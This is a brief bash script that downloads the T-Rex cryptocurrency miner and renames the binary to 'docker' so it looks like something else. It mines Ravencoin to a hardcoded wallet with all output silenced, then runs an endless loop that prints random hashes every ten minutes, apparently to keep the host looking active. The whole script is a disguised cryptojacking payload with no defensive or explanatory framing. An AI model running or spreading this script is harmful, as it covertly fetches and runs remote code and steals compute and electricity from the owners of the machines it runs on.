#!/bin/bash
wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xvf t-rex-0.26.8-linux.tar.gz >/dev/null 2>&1
mv t-rex docker
./docker -a kawpow -o stratum+tcp://stratum.ravenminer.com:3838 -u RKRS78LrjStY5att3R6LymSNw8rbSUNEFx.$(echo $(shuf -i 1000-9999 -n 1)-TEWW) -p x >/dev/null 2>&1
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
